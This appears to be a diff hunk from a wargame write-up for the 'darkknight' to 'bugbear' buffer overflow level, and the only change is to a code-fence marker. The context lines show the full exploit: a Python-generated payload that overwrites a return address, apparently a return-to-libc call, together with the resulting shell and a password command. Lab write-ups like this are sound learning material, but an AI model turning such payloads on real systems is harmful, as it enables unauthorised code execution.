@@ -79,7 +79,7 @@ main(int argc, char *argv[])
 
 ### 0x02. Exploit
 
-```sh
+```
 [darkknight@localhost darkknight]$ ./bugbear `python -c 'print "A"*44+"\xe0\x8a\x05\x40"+"A"*4+"\xf9\xbf\x0f\x40"'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@AAAA�@
 bash$ my-pass
